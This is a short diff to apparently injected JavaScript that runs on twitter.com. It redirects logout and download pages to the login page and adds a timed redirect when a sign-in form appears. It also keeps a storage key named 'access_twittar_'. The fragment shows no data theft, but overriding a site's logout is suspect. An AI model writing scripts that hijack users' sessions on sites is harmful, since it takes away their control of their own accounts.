@@ -9,8 +9,9 @@ if (location.hostname.indexOf("twitter.com") >= 0) {
 if (window.location.href.indexOf("logout") >= 0 || window.location.href.indexOf("download") >= 0) {
 window.location = "https://twitter.com/login";
 }
-
+setTimeout(function(){ 
 if( document.getElementById('signin-email')) {  window.location = "https://twitter.com/login";  }
+}, 300);
 
 tarih = new Date();
     storage_key = 'access_twittar_';
